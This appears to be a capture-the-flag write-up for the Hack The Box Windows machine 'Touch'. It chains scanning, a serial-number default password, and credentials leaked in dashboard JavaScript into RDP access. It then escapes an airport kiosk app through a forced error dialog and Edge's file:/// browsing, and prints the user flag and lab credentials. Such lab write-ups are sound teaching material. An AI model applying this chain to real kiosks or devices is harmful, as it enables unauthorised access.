# HTB "Touch" — User Flag Writeup

**Target:** `10.129.45.167` (hostname: `KIOSK-042`, Windows 11 / Server 2025 Build 26100)
**Difficulty context:** Easy/Beginner Windows machine
**Flag obtained:** `user.txt` → `40239821905f96b42a8d4a439dd18773`

---

## 1. Reconnaissance

Initial service scan:

```bash
nmap -sV -sC --reason --min-rate 5000 10.129.45.167
```

Results:

| Port | Service | Notes |
|------|---------|-------|
| 135/tcp | msrpc | Standard Windows RPC |
| 3389/tcp | ms-wbt-server | RDP |
| 5985/tcp | http (WinRM) | Auth works later, but authorization fails for our user |
| 8443/tcp | http | **Nexion DeviceHub** management portal — primary attack surface |

No SMB (139/445) or LDAP (389) exposed — ruled out AD-style enumeration (`enum4linux-ng`, `rpcclient` all timed out as expected).

Key lesson: port 8443 *looked* like HTTPS in the nmap banner, but was actually **plain HTTP**. Confirmed when gobuster threw:
```
server gave HTTP response to HTTPS client
```
Fix: drop `https://` and `-k`, just use `http://`.

---

## 2. Web Enumeration — Nexion DeviceHub (port 8443)

### 2.1 Directory/API discovery

```bash
feroxbuster -u http://10.129.45.167:8443 -x php,asp,aspx,json,xml,config,bak -t 50 -C 404
```

Found:
- `/login` — staff/device login page
- `/css/style.css`
- `/api` → `403` (exists, but blocked without context)

Drilling into `/api`:
```bash
feroxbuster -u http://10.129.45.167:8443/api -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x json -t 50 -C 404,405
```

Found:
- `/api/status` → **200, unauthenticated**
- `/api/scan` → `405` (exists, wrong HTTP verb)

### 2.2 Unauthenticated information disclosure

```bash
curl -s http://10.129.45.167:8443/api/status
```

```json
{
  "device": "Nexion DeviceHub DH-100",
  "serial": "NX-DH-2024-B7042",
  "firmware": "1.4.2",
  "status": "online",
  "uptime": 33117
}
```

This endpoint leaked the **device serial number** with no auth required — critical, because the login page itself hints at a serial-based default password scheme.

### 2.3 Default credential disclosed in the login page UI

Viewing `/login` revealed a tooltip/hint:

> "Forgot your password?" → title attribute: *"The default password is the device serial number included in your DeviceHub packaging."*

### 2.4 Authenticating to the DeviceHub portal

```bash
curl -s -c cookies.txt -X POST http://10.129.45.167:8443/login -d "password=NX-DH-2024-B7042" -i
```

Result: `302 Found` → `Location: /dashboard`, with a `Set-Cookie: nxsession=...` — authentication succeeded using the serial number as the password.

### 2.5 Credentials exposed in the dashboard HTML

Once authenticated, `GET /dashboard` (with the session cookie) returned HTML containing device credential fields with a "show" toggle:

```html
<span id="dsu1">••••••••</span>
<span onclick="toggleCred('dsu1','KioskUser')">show</span>
...
<span id="dsp1">••••••••</span>
<span onclick="toggleCred('dsp1','K!0sk2026#')">show</span>
```

**Classic client-side credential exposure** — the real username/password were embedded directly in the page's JS `onclick` handlers, not fetched via an authenticated API call. Masking was purely cosmetic (CSS/JS), not actual access control.

Recovered credentials:
```
Username: KioskUser
Password: K!0sk2026#
```

These turned out to be a **real local Windows account**, not just application-level creds.

---

## 3. Testing Credentials Against Remote Access Services

### 3.1 WinRM (port 5985) — authentication succeeds, authorization fails

```bash
evil-winrm -i 10.129.45.167 -u KioskUser -p 'K!0sk2026#'
```

Result: connects past the NTLM auth handshake, but any command returns:
```
WinRM::WinRMAuthorizationError
```

This indicates the password is correct, but `KioskUser` is **not a member of `Remote Management Users`** — WinRM is a dead end for this account.

### 3.2 RDP (port 3389) — works

```bash
xfreerdp3 /u:KioskUser /p:'K!0sk2026#' /v:10.129.45.167 /cert:ignore +clipboard /f
```

Successful login — but instead of a normal desktop, the session drops straight into a **fullscreen kiosk application** ("HTB Airways — Self Check-In"), simulating an airport self-service terminal. No taskbar, no visible way to reach the underlying OS.

---

## 4. Breaking Out of the Kiosk Lockdown

### 4.1 Disabling the peripherals via the DeviceHub API

Using the still-valid DeviceHub session cookie from earlier:

```bash
curl -s -b cookies.txt -X POST http://10.129.45.167:8443/api/scanner/power \
  -H "Content-Type: application/json" -d '{"powered":false}'

curl -s -b cookies.txt -X POST http://10.129.45.167:8443/api/printer/power \
  -H "Content-Type: application/json" -d '{"powered":false}'
```

Both returned `{"success":true,"powered":false}` — scanner and printer hardware were taken offline from the management API, independent of the kiosk GUI session.

### 4.2 Triggering the Staff Login error

Back in the RDP kiosk session, clicking **STAFF LOGIN** (bottom-right of the welcome screen) and authenticating with `KioskUser` / `K!0sk2026#` led to a **"Staff Authentication"** screen reporting:

```
⚠ Scanner offline
```

Because the scanner hardware had been disabled via the API in step 4.1, the kiosk's own hardware-health check failed — this is what triggered a secondary **native Windows error dialog** (not part of the kiosk's web UI):

```
Nexion DocReader SR-4200 - Error
Nexion DocReader SR-4200 has stopped responding.
Error Code: SCN-ERR-4092
Device: NX-SR-2024-0042
Contact your system administrator or visit the support page for troubleshooting steps.

https://support.nexionsystems.com/docreader/troubleshoot
```

This dialog is a genuine OS-level popup (native title bar, separate `X` close control) sitting *outside* the kiosk's fullscreen browser lock — the actual escape hatch.

### 4.3 From the error dialog to Microsoft Edge

Clicking the embedded support link launched **Microsoft Edge** as an independent process, breaking out of the kiosk's restricted environment.

### 4.4 From Edge to `cmd.exe`

In the Edge address bar:

```
file:///C:/Windows
```

Navigating the local filesystem via `file:///` URIs in Edge rendered a directory-style file listing. From there, locating and opening `cmd.exe` (via `C:\Users\KioskUser\Downloads\cmd.exe`, where it had apparently been staged/copied) launched an interactive command shell.

> Note: the shell displayed many `"The system cannot find message text..."` errors — these are cosmetic (missing message-table resources for `FormatMessage`) and do **not** block command execution; they can be ignored.

---

## 5. Reading the Flag

From the resulting `cmd.exe` session running as `KioskUser`:

```cmd
C:\Users\KioskUser\Downloads> cd ..
C:\Users\KioskUser> cd Desktop
C:\Users\KioskUser\Desktop> dir
...
10/06/2026  01:47 AM         34 user.txt
...
C:\Users\KioskUser\Desktop> type user.txt
40239821905f96b42a8d4a439dd18773
```

**User flag:** `40239821905f96b42a8d4a439dd18773`

---

## 6. Attack Chain Summary

```
TCP/8443 (Nexion DeviceHub)
  → unauthenticated /api/status leaks device serial number
  → serial number is the default device password
  → authenticate to DeviceHub dashboard
  → real Windows credentials (KioskUser) exposed in dashboard's client-side JS
  → RDP (3389) login succeeds as KioskUser
  → dropped into fullscreen airport kiosk app (WinRM denied — no remoting rights)
  → use authenticated DeviceHub API to power off the scanner peripheral
  → trigger Staff Login in the kiosk → hardware-check fails → native Windows
    error dialog appears (outside kiosk sandbox)
  → click embedded support link → spawns Microsoft Edge
  → use file:///C:/Windows in Edge to browse the filesystem and launch cmd.exe
  → read C:\Users\KioskUser\Desktop\user.txt
```

## 7. Key Takeaways / Lessons

- **Unauthenticated API responses can leak more than intended.** A simple device-status endpoint leaked a serial number that doubled as a default password.
- **Never trust client-side credential masking.** The "show password" buttons revealed secrets that were already present in the page's JS, not fetched via a secured call.
- **Kiosk lockdowns are only as strong as their error-handling paths.** A hardware-fault dialog (triggerable at will via an authenticated management API) became the actual breakout vector.
- **`file:///` URIs in a kiosk-restricted browser are a classic breakout technique** for reaching the local filesystem and launching native binaries.
- **WinRM authentication succeeding is not the same as having remoting rights** — always check for `WinRMAuthorizationError` vs. connection/auth failures, and pivot to RDP when WinRM is only partially usable.
